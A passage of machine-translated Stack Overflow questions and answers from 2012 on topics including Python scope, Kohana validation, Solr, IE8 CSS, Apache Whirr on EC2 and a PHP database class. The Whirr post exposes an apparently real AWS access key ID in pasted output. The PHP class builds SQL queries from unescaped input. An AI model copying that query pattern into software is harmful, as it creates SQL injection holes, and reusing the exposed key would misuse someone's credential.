            stats['fistro'] = 1 # Modifing stats var without global keywork and works why??
        cnt += 1

if __name__ == "__main__":
    main() 
```

所以我误解了具有全球范围的东西有人可以解释我吗？？？谢谢，对不起我的英语不好

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-04T17:32:42.070

这是有效的，因为您没有更改引用，而是访问一个可变对象，并让它自己执行更改。

`global`需要为全局范围的变量 ( `x = blah`) 分配一个新值，但不需要仅仅访问一个。当您`data.pop(cnt)`所做的只是访问变量时，您可以在不使用`global`关键字的情况下进行操作。

简而言之，这不是*改变*对象的属性，而是将对象*分配*给变量。

# php - Kohana 验证：范围规则的正确语法

> ID：13221043
> 
> 赞同：4
> 
> 时间：2012-11-04T17:31:37.770
> 
> 标签：php, kohana, kohana-3.2

在为我的一个模型设置验证时，我无法获得“范围”规则的正确语法。每个变体似乎只传递（第一个）最小参数，而不是（第二个）最大值。

```
/**
 * @var   array  Validation rules
 */
public function rules()
{
    return array(
        'title' => array(
            array('not_empty'),
            array('max_length', array(':value', 50)),
        ),
        'time' => array(
            array('not_empty'),
            array('date'),
        ),
        'date' => array(
            array('not_empty'),
            array('date'),
        ),
        'limit' => array(
            array('digit'),
            array('range', array(':value', 1), array(':value', 255)),
        ),
    );
} 
```

我也试`array('range', array(':value', array(1, 255)))`了也没用。

有什么建议么？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-11-04T18:15:26.590

Range Rule 的正确语法需要 3 个参数而不是 2 个。正如您在文档中看到的那样：http: [//kohanaframework.org/3.2/guide/api/Valid#range](http://kohanaframework.org/3.2/guide/api/Valid#range)

所以代码一定是这样的：

```
array('range', array(':value', 1, 255)), 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-01-09T13:40:47.030

请注意，范围是 ]min;max[ 不是 [min;max]，因此**排除了限制**。

数组('范围', 数组(':值', 1, 255)) => [2;254]

# machine-learning - 图论 - 学习成本函数以找到最佳路径

> ID：13221044
> 
> 赞同：8
> 
> 时间：2012-11-04T17:31:59.400
> 
> 标签：machine-learning, graph-theory, classification

这是一个有监督的学习问题。

我有一个有向无环图（DAG）。每条边都有一个特征向量X，每个节点（顶点）都有一个标签0或1。任务是找到一个代价函数w(X)，使得任意一对节点之间的最短路径具有最高比例1s 到 0s（最小分类错误）。

解决方案必须很好地概括。我尝试了逻辑回归，学习到的逻辑函数可以很好地预测节点的标签，给出传入边缘的特征。但是，该方法没有考虑到图的拓扑结构，因此整个图中的解决方案不是最优的。换句话说，考虑到上述问题设置，逻辑函数不是一个好的权重函数。

虽然我的问题设置不是典型的二元分类问题设置，但这里有一个很好的介绍： [http ://en.wikipedia.org/wiki/Supervised_learning#How_supervised_learning_algorithms_work](http://en.wikipedia.org/wiki/Supervised_learning#How_supervised_learning_algorithms_work)

以下是更多细节：

1.  每个特征向量 X 是一个 d 维实数列表。
2.  每条边都有一个特征向量。也就是说，给定边集 E = {e1, e2, .. en} 和特征向量集 F = {X1, X2 ... Xn}，则边 ei 与向量 Xi 相关联。
3.  可以提出一个函数 f(X)，因此 f(Xi) 给出了边 ei 指向标有 1 的节点的可能性。我上面提到的这个函数的一个例子是通过逻辑找到的回归。然而，正如我上面提到的，这样的功能是非最佳的。

所以问题是：给定图，一个起始节点和一个结束节点，我如何学习最优成本函数 w(X)，使节点 1 与 0 的比率最大化（最小分类错误）？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-15T01:46:29.520

这不是一个真正的答案，但我们需要澄清这个问题。不过，我可能稍后会回来寻找可能的答案。

下面是一个示例 DAG。

![在此处输入图像描述](../Images/f8b434bc2471b4b3fe212e6570b10624.png)

假设红色节点是起始节点，黄色节点是结束节点。你如何定义最短**路径**

> 1s 与 0s 的最高比率（最小分类错误） ?

**编辑**：我为每个节点添加名称，并为前两个边缘添加两个示例名称。

在我看来，您无法学习这样一种成本函数，它将特征向量作为输入，其输出（边权重？或其他）可以引导您在考虑图拓扑的情况下采取最短路径前往任何节点。原因如下：

*   假设您没有您所说的特征向量。给定如上图，如果您想找到与`1`s 与`0`s 的比率相关的所有对最短路径，最好使用[Bellman 方程](http://en.wikipedia.org/wiki/Bellman_equation)或更具体地说是[Dijkastra](http://en.wikipedia.org/wiki/Dijkstra%27s_algorithm)加上适当的启发式函数（例如，`1`s 在路径）。另一种可能的无模型方法是使用[q-learning](http://en.wikipedia.org/wiki/Q-learning)，其中访问节点获得奖励 +1，访问`1`节点获得奖励 -1 `0`。我们一次为每个目标节点学习一个查找 q-table。最后，当所有节点都被视为目标节点时，我们得到了全对最短路径。

*   现在假设，您神奇地获得了特征向量。既然您能够在没有这些向量的情况下找到最佳解决方案，那么当它们存在时它们如何提供帮助？

*   有一种可能的情况是，您可以使用特征向量来学习优化边权重的成本函数，即特征向量取决于图拓扑（节点之间的链接以及`1`s 和`0`s 的位置）。但是我在您的描述中根本没有看到这种依赖关系。所以我猜它不存在。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T05:04:56.760

这看起来像是遗传算法具有巨大潜力的问题。如果您将所需的函数定义为例如（但不限于）特征的线性组合（您可以添加二次项，然后是三次项，无限次），那么基因就是系数向量。mutator可以只是一个或多个系数在合理范围内的随机偏移。评估函数只是根据当前突变，所有对的最短路径上 1 与 0 的平均比率。在每一代，挑选最好的少数基因作为祖先，并变异形成下一代。重复直到 ueber 基因在手边。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-06-06T19:52:31.937

我相信您的问题与逆强化学习领域非常接近，您可以在其中对最佳路径进行某些“专家演示”并尝试学习成本函数，以便您的规划器（A* 或某些强化学习代理）输出相同的路径作为专家示范。这种训练是以迭代的方式完成的。我认为在您的情况下，您可以创建专家演示作为通过最大数量的 1 个标记边缘的路径。这是一篇关于同一篇好论文的链接：[学习搜索：模仿学习的功能梯度技术](http://www.ri.cmu.edu/pub_files/2009/7/learch.pdf)。它来自机器人社区，其中运动规划通常设置为图形搜索问题，学习成本函数对于展示所需行为至关重要。

# c# - RegEx 端口枚举验证

> ID：13221048
> 
> 赞同：0
> 
> 时间：2012-11-04T17:32:06.607
> 
> 标签：c#, .net, regex

我是正则表达式的新手，请帮我写一个新的正则表达式。它应该适用于这些：

```
28
28,57,130
13-18
13,18-57,65
44-56,50-130,150,180-213
12-25,28
1024-8000,27000-30000
1024-65535 
```

它不应该为

```
15,13 // 13 is less than 15
15-11 // 11 is less than 15
15-18,10
15-18,20,11-130 // because of 11
0 // port number 0 is reserved and can't be used 
11-180,250,65536 // it should be less than 65535 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T17:42:34.363

使用`regex`它会使它更复杂..

而不是使用`regex`你可以`parse`这样

```
bool matchIt(string input)//returns true|false for a match
{
    if(input=="0")return false;//cuz you dont want to match 0
    string[] parts=input.Split(new char[] { ',','-' }, StringSplitOptions.None);//split them
    int prev=int.Parse(parts[0]);
    foreach(string s in parts)
    {
        if(prev>int.Parse(s))return false;
        prev=int.Parse(s);
    }
    return true;
} 
```

# visual-c++ - 读取 VC++ PDB 源文件边界和行

> ID：13221051
> 
> 赞同：0
> 
> 时间：2012-11-04T17:32:37.697
> 
> 标签：visual-c++, pdb

因此，我反向生成了一个程序，其中包含一个 PDB，其中包含函数、源文件和全局变量符号。我使用 IDA PRO，其中包括 PDB 中的函数和变量名称，但我不知道每个函数属于哪个源文件。在某处我读到这个文件还包括每个源文件的编译器参数。问题不在互联网上，我找不到从程序数据库中读取所有信息的工具。我还找到了一本描述格式的书（未记录的 Windows 2000 秘密）。有人知道可以帮助我的程序吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T22:55:25.603

请参阅“%ProgramFiles(x86)%\Microsoft Visual Studio 10.0\DIA SDK\Samples\DIA2Dump”。它使用[DIA](http://msdn.microsoft.com/en-us/library/x93ctkx8)访问 PDB，可以显示很多信息。

如果您不想弄乱编译的东西，可以尝试Windows 调试工具中的**dbh.exe**。它的[命令](http://msdn.microsoft.com/en-us/library/windows/hardware/ff540441)有点神秘，但它确实具有显示源文件/行信息的功能。

# ipad - MasterView 控制器中的 WebView

> ID：13221053
> 
> 赞同：0
> 
> 时间：2012-11-04T17:32:43.080
> 
> 标签：ipad, uiwebview

我想显示一个 webview，用于解锁一个网站，为 iPad 版本的主控制器中的详细视图控制器提供数据。然而，当我这样做时，与我成功使用 TableView 所做的类似，只是调用了 ViewDidLoad 回调，而不是 ViewWillAppear，而且通常似乎没有发生任何事情，就像视图没有显示一样。我的代码在 iPhone 版本中无缝运行，而我多次检查 StoryBoard 却没有发现任何可疑之处。关于这是什么原因和解决方案的任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T18:42:30.200

无论如何，我用 PopUp 替换了 MasterController 并且一切正常：仍然怀疑为什么 WebView 不能在 masterViewController 中显示：也许只是 tableviews 可能会显示在那里。

# java - 保存布局以供以后查看

> ID：13221055
> 
> 赞同：-1
> 
> 时间：2012-11-04T17:32:55.397
> 
> 标签：java, android, sqlite, sharedpreferences

我创建了一个应用程序，用户可以在其中添加或删除 tableLayout 中的行。在这些行中，用户输入学术课程名称、课程中收到的字母等级以及课程价值的单元数。然后，它计算用户的 gpa。

我不知道该怎么做，但是当用户按下“保存”按钮时，我需要保存布局的精确副本，这将保存每个当前的特定内容。（例如，editTexts 的数量、editTexts 中的文本、行数等）

我研究过使用 SharedPreferences 和使用 SQLite。我不确定哪一个更适合保存多个特定布局。另外，我对使用 SQLite 一无所知，因为我以前从未使用过它，所以如果这是最好的选择，您能否发布一个链接或其他内容到一个好的教程？谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T17:44:18.000

避免数据库访问，您可以使用简单的二维数组来存储所有数据 例如：

//保存第一个布局的信息

```
String[][] data= new String[4][4];
data[0][0] =editTextno;
data[0][1] =editText;
data[0][2] =noofrows;
data[0][3] =field4; 
```

要保存第二、第三的信息，您可以类似地更改索引号。就像`data[1]`布局 1，`data[2]`布局 2

稍后您可以在 SharedPreference 中设置此数组，也可以创建 setter getter 来存储此数组，并可以在任何您想要的地方检索用户输入的信息的数组

# java - 如何找到一周中的哪一天是java

> ID：13221061
> 
> 赞同：0
> 
> 时间：2012-11-04T17:33:23.750
> 
> 标签：java, datetime, calendar, dayofweek

我想在java中找到一周中的哪一天而不使用日期和其他自行完成的方法。我可以找到两个日期之间的日差，但我不明白如何找到特定日期是一周中的哪一天.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T17:38:08.377

如果您可以找到两天之间的天差，那么只需使用 mod 运算符。

例如，如果您知道`day1 = Monday`，并且您想找出 701 天之后的哪一天，那就是`Monday + 701 % 7 = Monday + 1 = Tuesday`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T17:40:00.053

有一些公式可以确定特定日期在一周中的哪一天：

[http://en.wikipedia.org/wiki/Determination_of_the_day_of_the_week#Purely_mathematical_methods](http://en.wikipedia.org/wiki/Determination_of_the_day_of_the_week#Purely_mathematical_methods)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-04T18:14:34.533

您选择的方法似乎极其复杂且容易出错。

我建议创建您自己的名为*Date*的类。

日期将包含月、日和年，并且知道如何减去或添加天数。

它还应该能够确定它是等于、之前还是之后的另一个日期。

您应该使用一个整数数组来表示每个月的天数。

该数组可以是 Date 类的私有静态字段。

然后，您可以创建一个代表 date2 的类的实例，并一次减去一天，直到等于 date1。

您可以使用类似的方法通过将输入日期与具有已知星期几的基准日期进行比较来确定星期几。

我敢肯定，这就是你的导师为这项作业准备的。

这将教给你一个宝贵的教训：

利用对象来使用封装，而不是使用一堆*if 语句*。

# scala - 将 Play 2.0 Web 应用程序与非 Web 功能相结合

> ID：13221064
> 
> 赞同：1
> 
> 时间：2012-11-04T17:33:49.480
> 
> 标签：scala, playframework, playframework-2.0, akka

我正在启动一个项目，该项目应该同时提供：

*   简单的 http API 和
*   其他一些功能（包括一些低级网络）。

这就是为什么我想将“其他功能”与（新的）Play 框架项目集成并利用它的动态编译和其他好处。大部分应用程序（包括业务逻辑和服务器负载）将位于项目的非 Web 部分。

所以我的问题是：如何将这两个模块打包到一个 Scala 应用程序中？

我认为我发现的最佳方法是将非 Web 部件视为 Play 项目的[插件](https://github.com/playframework/Play20/wiki/Scalaplugin)。但是，我不确定这是否是正确的方法，考虑到大多数应用程序可能最终会出现在这样的“插件”中。

我曾考虑将这两个部分部署为单独的应用程序，但我怀疑它是否适合我：我希望应用程序共享（以及其他）缓存、配置和数据库连接，我不应该真正将它们分开。

我还没有使用 Scala 或 Play 的经验，所以我非常感谢您的意见。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-04T18:03:04.090

我建议使用 Akka Actor 系统来集成您现有的业务逻辑和网络服务。您可以轻松添加多个 Akka Actor 系统并将它们集成到您的 Play 应用程序中的完整系统中。Play 还带有一个您可以利用的[内部演员系统。](http://www.playframework.org/documentation/2.0.4/ScalaAkka)

因此，您可以将现有逻辑包装到一个 Actor 系统中，或者您可以构建小型 Actor 系统来负责与现有系统的集成，并在 Play 应用程序加载时将这些连接器作为 Actor 系统启动。

这是一个示例，当 Play 应用程序加载时，您可以如何加载内部参与者系统。

```
object Global extends GlobalSettings {

  override def onStart(app: Application) {
    Logger.info("Application starting...")
    lazy val enabled = Play.configuration.getString("external-service").filter(_ == "enabled").isDefined

    // Start External service
    enabled match {
      case true => {
        Logger.info("External service is enabled.")
        Akka.system.actorOf(Props[ExternalServiceClient], name = "serviceClient")
      }
      case false => {
        Logger.info("External service is disabled.")
      }
    }
  }

  override def onStop(app: Application) {
    Logger.info("Application shutdown...")
  }
} 
```

如果需要，您还可以在应用程序中加载新的参与者系统，执行类似的操作。

```
 import akka.actor.ActorSystem

  val eventSystem = ActorSystem("events")

  // Start a service using the ActorSystem
  val eventService = EventService(eventSystem)

  // Create an Actor in the ActorSystem
  val eventActor = eventSystem.actorOf(Props[EventActor], name = "eventactor") 
```

您可以在此处阅读有关[Play Akka 集成的](http://www.playframework.org/documentation/2.0.4/ScalaAkka)更多信息。Play 还具有内置功能，您可以在其中利用具有[ScalaAsync](http://www.playframework.org/documentation/2.0.4/ScalaAsync)等功能的内置 actor 系统。因此，如果您的外部服务主要是基于 HTTP 的服务，那么该方法可能最适合您。如果您为外部服务构建参与者系统，则可以作为远程参与者访问，如此处所述[Akka Remoting](http://doc.akka.io/docs/akka/snapshot/scala/remoting.html)

# search - solr 模式同义词问题

> ID：13221065
> 
> 赞同：1
> 
> 时间：2012-11-04T17:33:55.440
> 
> 标签：search, solr, lucene, multilingual

我使用此配置搜索包含英文产品和中文等效产品的数据。

```
 <fieldType name="text_synm" class="solr.TextField">
        <analyzer type="index">

        <tokenizer class="solr.CJKTokenizerFactory"/>

            <filter class="solr.SynonymFilterFactory" synonyms="synonym.txt" ignoreCase="true" expand="false"/>
              <filter class="solr.WordDelimiterFilterFactory" generateWordParts="1" generateNumberParts="1" splitOnNumerics="1" />
               <filter class="solr.LowerCaseFilterFactory"/>

        </analyzer>

        <analyzer type="query">

            <tokenizer class="solr.CJKTokenizerFactory"/>

              <filter class="solr.SynonymFilterFactory" synonyms="synonym.txt" ignoreCase="true" expand="false"/>
              <filter class="solr.WordDelimiterFilterFactory" generateWordParts="1" generateNumberParts="1" splitOnNumerics="1" />
               <filter class="solr.LowerCaseFilterFactory"/>

        </analyzer>
    </fieldType> 
```

但是当我在 solr admin 中用中文搜索时，它没有给我任何结果

我试着用

```
<tokenizer class="solr.WhitespaceTokenizerFactory"/> 
```

代替

```
<tokenizer class="solr.CJKTokenizerFactory"/> 
```

但没有结果我确保 synonym.txt 是 utf-8 编码

这里有什么线索吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T07:27:06.173

我认为我应该以任何方式编辑 apach/conf/server.xml 并添加它

```
URIEncoding="UTF-8" useBodyEncodingForURI = "false" 
```

例如连接器标签

```
 <Connector port="8080" protocol="HTTP/1.1" 
           connectionTimeout="20000" 
           redirectPort="8443" URIEncoding="UTF-8" useBodyEncodingForURI = "false" /> 
```

也在

```
 <Connector port="8009" protocol="AJP/1.3" redirectPort="8443"> 
```

我应该添加这个

```
URIEncoding="UTF-8" 
```

在我的情况下它不起作用的任何方式可能是因为我的 synonym.txt 文件混合在中文和英文之间我希望有人找到更高级的答案。

# sql - 如何从 Web 服务器下载数据并保存核心数据

> ID：13221068
> 
> 赞同：-1
> 
> 时间：2012-11-04T17:34:11.480
> 
> 标签：sql, database, core-data

我有一个正在开发的应用程序，它将有大约 500 个联系人、姓名、电子邮件地址、网站地址等。我将经常更新联系人添加新联系人，并更新更改的电子邮件。有人建议我使用核心数据执行此操作的最佳方法是进行提取以查找最年轻的记录并询问我的服务器以获取所有更年轻的记录。

我的问题是如何从我的服务器下载最年轻的记录并将其保存以用于核心数据。

我环顾四周，但没有看到将核心数据与存储在服务器上的数据库一起使用的任何内容。或者我错过了什么，有没有另一种方法来创建这个应用程序。

我需要能够经常更新我的数据库并将结果传递给应用程序用户

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-05T12:13:37.680

它真的取决于您的服务器后端结构。

通过以下链接查看以下链接以完整了解整个过程： [如何将核心数据与 Web 服务同步](http://www.raywenderlich.com/15916/how-to-synchronize-core-data-with-a-web-service-part-1)

# css - IE8 不断打破我的专栏

> ID：13221080
> 
> 赞同：1
> 
> 时间：2012-11-04T17:35:10.017
> 
> 标签：css, wordpress, internet-explorer-8, frontend

我正在开发一个在 WordPress 上运行的新网站 - [http://cravezilla.com 。](http://cravezilla.com)我已经针对 Chrome、Mozilla、Safari 和 IE9+ 优化了该网站。但是，在 IE8 上，我网站的栏目都被扔掉了，我无法弄清楚为什么？

我附上了我的 IE8 预览的截图。我可以在 CSS 中包含一些东西来解决这个问题吗？

这是图像： ![在此处输入图像描述](../Images/d20f3fbf99bbef6e1faefe7d4453601e.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T17:49:18.820

在你的css文件中试试这个

```
.tri-block:last-child{
    margin-right:0;
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T17:49:56.030

您正在使用 IE8 不支持的 box-sizing 属性。事情是你有一个 950px 固定宽度的 3 个元素的包装 div。并且您指定每个元素的宽度为 33.3%，内边距为 8px。它适用于 box-sizing，因为填充没有添加到宽度中。并且由于 IE 没有该方法并将填充添加到宽度，您将获得 33.3% + 33.3% + 33.3% + 填充值，该值比 950px 固定大小更宽，并导致第三个元素浮动到新行。

我建议您删除 box-sizing 属性并将这些 div 的固定宽度设置为 300 像素左右。它应该在您的 css 文件的第 483 行。

希望能帮助到你。

# javascript - 使用 Graph API 获取信息时遇到问题

> ID：13221082
> 
> 赞同：1
> 
> 时间：2012-11-04T17:35:25.870
> 
> 标签：javascript, jquery, facebook, facebook-graph-api, facebook-javascript-sdk

我正在尝试使用 Facebook Graph API 来获取有关通过 Facebook 登录的用户的信息。

一开始，我只使用了一个函数，没有出现错误；但随后，我添加了另一个使用 Facebook API 的函数。从那一刻起，这些功能都不起作用。只有当我删除新功能时，旧功能才能再次工作......

我想代码将比我上面描述的更容易理解：

```
 function fb_login(){
        FB.login(function(response) {

            if (response.authResponse) {
                access_token = response.authResponse.accessToken; //get access token
                user_id = response.authResponse.userID; //get FB UID

                FB.api('/me', function(response) {
                    user_email = response.email; //get user email

                            $.ajax({
                              type: "POST",
                              url: "http://*******/ajax.php",
                              data: { action: "login", id: user_id, email: user_email, first_name: response.first_name, last_name: response.last_name }
                            }).done(function( msg ) {
                              alert( "Data Saved: " + msg );
                            });            
                });

        } else {
            //user hit cancel button
            console.log('User cancelled login or did not fully authorize.');

        }
    }, {
        scope: 'publish_actions,email,read_stream,publish_stream'
    });
} 
```

除非存在以下功能，否则上述功能将起作用。

```
function update_autopost(form)
{
    FB.api('/me', function(response) {
                    var autopost_value = form.autopost.checked;

                    if(autopost_value == false)
                    {
                        autopost_value = "off";
                    }
                    else{
                        autopost_value = "on";
                    }

                    $.ajax({
                      type: "POST",
                      url: "http://*********/ajax.php",
                      data: { action: "update", id: response.authResponse.userID, autopost: autopost_value }
                    }).done(function( msg ) {
                      alert( "Data Saved: " + msg );
                    });            
        });
} 
```

更详细地说，在添加第二个函数后，会发生两件事：

1.  第一个功能停止工作。
2.  第二个函数无法从 Facebook Graph API 获取信息（例如， *response.authResponse.userID*不起作用）。

# hadoop - 使用 Whirr 启动 EC2 集群

> ID：13221083
> 
> 赞同：0
> 
> 时间：2012-11-04T17:35:27.240
> 
> 标签：hadoop, amazon-ec2, cloudera, apache-whirr

我目前正在学习 Jeffery Breen 的教程。当我想用 Whirr 启动一个 ec2 集群时遇到了一些麻烦。我使用 cloudera 演示 vm cdh3u4。

我下载了 whirr 的 0.8.1 版本。

以下是我运行的所有命令：

```
$ wget http://mirror.switch.ch/mirror/apache/dist/whirr/whirr-0.8.1/whirr-0.8.1.tar.gz
$ tar zxf whirr-0.8.0.tar.gz
$ export PATH="~/whirr-0.8.0/bin:$PATH"

$ export AWS_ACCESS_KEY_ID=MY ACCESS KEY
$ export AWS_SECRET_ACCESS_KEY=MY SECRET ACCESS KEY

$ ssh-keygen -t rsa -P hadoop-ec2 
```

然后有人问我应该将密钥保存在哪个文件中，然后我输入：hadoop-ec2

```
$ whirr launch-cluster --config hadoop-ec2.properties 
```

...这是问题所在：没有启动任何实例！我收到以下消息：

```
Exception in thread "main" org.apache.commons.configuration.ConfigurationException: Cannot locate configuration source hadoop-ec2.properties
        at org.apache.commons.configuration.AbstractFileConfiguration.load(AbstractFileConfiguration.java:249)
        at org.apache.commons.configuration.AbstractFileConfiguration.load(AbstractFileConfiguration.java:229)
        at org.apache.commons.configuration.AbstractFileConfiguration.<init>(AbstractFileConfiguration.java:149)
        at org.apache.commons.configuration.PropertiesConfiguration.<init>(PropertiesConfiguration.java:252)
        at org.apache.whirr.command.AbstractClusterCommand.getClusterSpec(AbstractClusterCommand.java:122)
        at org.apache.whirr.cli.command.LaunchClusterCommand.run(LaunchClusterCommand.java:57)
        at org.apache.whirr.cli.Main.run(Main.java:69)
        at org.apache.whirr.cli.Main.main(Main.java:102) 
```

接下来我将属性文件直接链接到 Jeffrey Breen 在他的教程中发布的文件，然后我得到了以下内容：

```
[cloudera@localhost ~]$ whirr launch-cluster --config /home/cloudera/TutorialBreen/config/whirr-ec2/hadoop-ec2.properties
Running on provider aws-ec2 using identity ${env:AKIAIXPYW6EBNWSZWMTQ}
Bootstrapping cluster
Configuring template for bootstrap-hadoop-datanode_hadoop-tasktracker
Unable to start the cluster. Terminating all nodes.
org.jclouds.rest.AuthorizationException: POST https://ec2.us-east-1.amazonaws.com/ HTTP/1.1 -> HTTP/1.1 401 Unauthorized
        at org.jclouds.aws.handlers.ParseAWSErrorFromXmlContent.refineException(ParseAWSErrorFromXmlContent.java:123)
        at org.jclouds.aws.handlers.ParseAWSErrorFromXmlContent.handleError(ParseAWSErrorFromXmlContent.java:92)
        at org.jclouds.http.handlers.DelegatingErrorHandler.handleError(DelegatingErrorHandler.java:69)
        at org.jclouds.http.internal.BaseHttpCommandExecutorService$HttpResponseCallable.shouldContinue(BaseHttpCommandExecutorService.java:197)
        at org.jclouds.http.internal.BaseHttpCommandExecutorService$HttpResponseCallable.call(BaseHttpCommandExecutorService.java:167) . . . 
```

这是朝着正确方向迈出的一步吗？如果是，我该怎么做才能奏效？

我是一个非常初学者，所以我真的很感谢你的帮助，如果可能的话，尽可能“清楚”，因为我 - 正如我所说 - 一个初学者。

下一步将是运行此命令：

```
$ whirr run-script --script install-r+packages.sh --config hadoop-ec2.properties 
```

我真的希望在这里找到一些帮助，以便我可以继续学习本教程。

Whirr 配置文件：

```
whirr.cluster-name=hadoop-ec2

# Change the number of machines in the cluster here
whirr.instance-templates=1 hadoop-namenode+hadoop-jobtracker,5 hadoop-datanode+hadoop-tasktracker
# whirr.instance-templates=1 hadoop-namenode+hadoop-jobtracker,1 hadoop-datanode+hadoop-tasktracker

# Uncomment out these lines to run CDH
# You need cdh3 because of the streaming combiner backport
whirr.hadoop.install-function=install_cdh_hadoop
whirr.hadoop.configure-function=configure_cdh_hadoop
# make sure java is set up correctly, requires Whirr >= 0.7.1
whirr.java.install-function=install_oab_java 

# For EC2 set AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY environment variables.
whirr.provider=aws-ec2
whirr.identity=${env:DFD...(mycode)..DFDSDF}
whirr.credential=${env:df342.(mycode)..3434324}

# The size of the instance to use. See http://aws.amazon.com/ec2/instance-types/
whirr.hardware-id=m1.large
# whirr.hardware-id=c1.xlarge

# select recent, 64-bit CentOS 5.6 AMI from RightScale
whirr.image-id=us-east-1/ami-49e32320

# here's what Cloudera recommends:
# whirr.image-id=us-east-1/ami-ccb35ea5

# If you choose a different location, make sure whirr.image-id is updated too
whirr.location-id=us-east-1

# You can also specify the spot instance price
# http://aws.amazon.com/ec2/spot-instances/
# whirr.aws-ec2-spot-price=0.109

# By default use the user system SSH keys. Override them here.
# whirr.private-key-file=${sys:user.home}/.ssh/id_rsa
# whirr.public-key-file=${sys:user.home}/.ssh/id_rsa.pub

# Expert: override Hadoop properties by setting properties with the prefix
# hadoop-common, hadoop-hdfs, hadoop-mapreduce to set Common, HDFS, MapReduce
# site properties, respectively. The prefix is removed by Whirr, so that for
# example, setting 
# hadoop-common.fs.trash.interval=1440
# will result in fs.trash.interval being set to 1440 in core-site.xml.

# Expert: specify the version of Hadoop to install.
#whirr.hadoop.version=0.20.2
#whirr.hadoop.tarball.url=http://archive.apache.org/dist/hadoop/core/hadoop-${whirr.hadoop.version}/hadoop-${whirr.hadoop.version}.tar.gz 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-05T13:47:46.607

是的 删除`#`

样品在这里：

```
whirr.private−key−file=${sys:user.home}/.ssh/whirr_id_rsa
whirr.public−key−file=${sys:user.home}/.ssh/whirr_id_rsa.pub 
```

替换`whirr_id_rsa`为您的文件名。更多细节在这里：

[http://www.xmsxmx.com/apache-whirr-create-hadoop-cluster-automatically/](http://www.xmsxmx.com/apache-whirr-create-hadoop-cluster-automatically/)

# php - 如何使用 PHP OOP 创建选择列表

> ID：13221084
> 
> 赞同：1
> 
> 时间：2012-11-04T17:35:32.077
> 
> 标签：php, class, selectlist

我已经开始将 PHP 项目重新编码为 OOP。我无法解决的一件事是如何制作动态选择列表。我有很多查找选择列表要制作。最好的方法是什么？

我创建了一个包含所有通用数据库查询的 DatabaseObject 类。我是在此处添加它们还是为它们创建一个特殊的类，以及如何进行编码？

```
require_once("database.php");

class DatabaseObject {

protected static $table_name;

// find all from a specific table
public static function find_all(){      
    global $database;
    return static::find_by_sql("SELECT * FROM ".static::$table_name);       
}

// select all from a specific table
public static function find_all_from($table){       
    global $database;
    return static::find_by_sql("SELECT * FROM " .$table);       
}

// find all from a specific table
public static function find_by_id($id){

    global $database;
    $result_array = static::find_by_sql("
    SELECT * FROM ".static::$table_name. " WHERE id = '{$id}' LIMIT 1");

    // return the data only for the one user
    return !empty($result_array) ? array_shift($result_array) : false;      
}

// find using sql
public static function find_by_sql($sql=""){

    global $database;
    // return all data from sql
    $result_set = $database->query($sql);
    $object_array = array();
    while($row = $database->fetch_array($result_set)){
        $object_array[] = static::instantiate($row);    
    }
    return $object_array;       
}

protected static function instantiate($record){

    $class_name = get_called_class();
    $object = new $class_name;

    foreach($record as $attribute=>$value){
        if($object->has_attribute($attribute)){
            $object->$attribute = $value;
        }
    }
    return $object;
}

protected function has_attribute($attribute){

$object_vars =  $this->attributes();

// here we only want to know if the key exist
// so we will return true or false
return array_key_exists($attribute, $object_vars);      
}

protected function attributes() {

$attributes = array();
foreach(static::$db_fields as $field) {
    if(property_exists($this,$field)) {
    $attributes[$field]= $this->$field; 
    }
}
return $attributes; 
}

protected function sanitised_attributes() {
global $database;
$clean_attributes = array();
foreach($this->attributes() as $key => $value){
$clean_attributes[$key] = $database->escape_value($value);  
}
return $clean_attributes;   
}

public function save() {
// A new object won't have an id yet
return isset($this->id) ? $this->update() : $this->create();
}

// create new  
protected function create() {
global $database;
$attributes =$this->sanitised_attributes();

$sql  = "INSERT INTO ".static::$table_name." (";
$sql .= join(", " ,array_keys($attributes));
$sql .= ") VALUES ( '";
$sql .= join("', '" ,array_values($attributes));
$sql .= "')";
if($database->query($sql)) {
    $this->id = $database->insert_id();
    return true;
} else {
    return false;
}
}

// update details
protected function update() {
global $database;
$attributes =$this->sanitised_attributes();
$attribute_pairs = array();
foreach($attributes as $key => $value) {
    $attribute_pairs[] = "{$key}='{$value}'";   
}
$sql  = "UPDATE " .static::$table_name. " SET ";    
$sql .= join(", ",$attribute_pairs);
$sql .= " WHERE id=". $database->escape_value($this->id);
$database->query($sql);
return ($database->affected_rows() ==1) ? true : false ;
}

public function delete() {
global $database;

$sql  = "DELETE FROM ".static::$table_name;
$sql .= " WHERE id =". $database->escape_value($this->id);
$sql .= " LIMIT 1";
$database->query($sql);
return ($database->affected_rows() ==1) ? true : false ;
}
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-05T13:38:20.827

我肯定会将选择列表建模为一个对象，因为它具有可以封装的明确定义的职责。我会尽量保持它与类的分离，`DatabaseObject`以便这些类中的任何一个的更改都不会影响另一个。例如，考虑：

```
class SelectList
{
    protected $options;
    protected $name;

    public function __construct($name, $options)
    {
         $this->options = $options;
         $this->name = $name;
    }

    public function render()
    {
        $html = "<select name='" . $this->name . "'>\n";
        foreach ($this->options as $option) 
        {
            $html .= $option->render();
        }
        $html .= "</select>\n";
        return $html;
    }
}

class SelectListOption
{
    protected $label;
    protected $value;
    protected $isSelected;

    public function __construct($label, $value, $isSelected = false)
    {
